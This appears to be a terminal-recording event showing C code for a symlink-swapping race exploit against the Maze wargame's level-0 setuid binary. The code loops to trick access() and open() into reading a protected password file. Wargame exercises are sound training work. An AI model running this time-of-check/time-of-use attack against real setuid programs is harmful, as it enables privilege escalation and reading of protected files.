[23.211561, "o", "#include <fcntl.h>\r\r\n#include <stdio.h>\r\r\n#include <unistd.h>\r\r\n/* maze L0 flipper: /maze/maze0 does access(PATH,R_OK) -> setresuid(euid)\r\r\n *    -> open(PATH) on the fixed path P.  The flipper keeps P swapping\r\r\n *       between a plain readable filler file (passes the access check) and\r\r\n *          a symlink to the next password file (open() follows the link).\r\r\n *             Recreates both donors every cycle, so the swap never stalls. */\r\r\nint main(void) {\r\r\n  const char *P = \"/tmp/128ecf542a35ac5270a87dc740918404\";\r\r\n  const char *A = \"/tmp/real_f\";\r\r\n  const char *B = \"/tmp/link_s\";\r\r\n  char filler[19] = \"AAAAAAAAAAAAAAAAAAA\";\r\r\n  for (;;) {\r\r\n    rename(A, P);\r\r\n    rename(B, P);\r\r\n    int fd = open(A, O_WRONLY|O_CREAT|O_TRUNC, 0644);\r\r\n    write(fd, filler, 19);\r\r\n    close(fd);\r\r\n    unlink(B);\r\r\n    symlink(\"/etc/maze_pass/maze1\", B);\r\r\n  }\r\r\n  return 0;\r\r\n}\r\r\n\r\r\n"]
